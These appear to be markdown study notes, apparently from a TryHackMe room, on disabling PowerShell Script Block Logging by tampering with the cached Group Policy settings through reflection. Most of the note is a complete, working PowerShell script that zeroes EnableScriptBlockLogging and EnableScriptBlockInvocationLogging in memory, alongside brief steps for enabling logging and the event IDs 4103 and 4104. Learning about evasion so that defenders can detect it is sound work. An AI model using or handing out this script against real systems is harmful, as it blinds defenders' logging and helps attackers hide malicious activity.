# ETW Evasion Group Policy Takeover

- Enabled from Group Policy:
	- `Search -> Run -> gpedit.msc
	- `Administrative Templates -> Windows Components -> Windows PowerShell`. 
	- `Turn on PowerShell Script Block Logging`

[[Windows-Events-To-Monitor]]:

|**Event ID**|**Purpose**|
|---|---|
|4103|Logs command invocation|
|4104|Logs script block execution|


Group Policy Takeover
1. Obtain group policy settings from the utility cache - type of `System.Management.Automation.Utils` and identify the GPO cache field: `cachedGroupPolicySettings`
```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
```
2. Modify generic provider to `0`.  In this case `EnableScriptBlockLogging` for takeover of Script Block Logging
```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```
3. Modify the invocation or module definition   In this case `EnableScriptBlockInvocationLogging` for takeover of Script Block Logging
```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

Full script:
```powershell
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
  If ($GroupPolicyField) {
      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
      If ($GroupPolicyCache['ScriptBlockLogging']) {
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
      }
      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
      $val.Add('EnableScriptBlockLogging', 0);
      $val.Add('EnableScriptBlockInvocationLogging', 0);
      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
  };
```

## References

[THM Evading Logging and Monitoring](https://tryhackme.com/room/monitoringevasion)
[Microsoft DevBlogs - Use PowerShell to Find ETW Providers](https://devblogs.microsoft.com/scripting/powertip-use-powershell-to-find-etw-providers/)
[Microsoft Documentation - PowerShell Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3)
[Medime - Ammad Ali - PowerShell Logging: Module Logging vs Script Block Logging](https://medium.com/@ammadb/powershell-logging-module-logging-vs-script-block-logging-7aa74bf66261)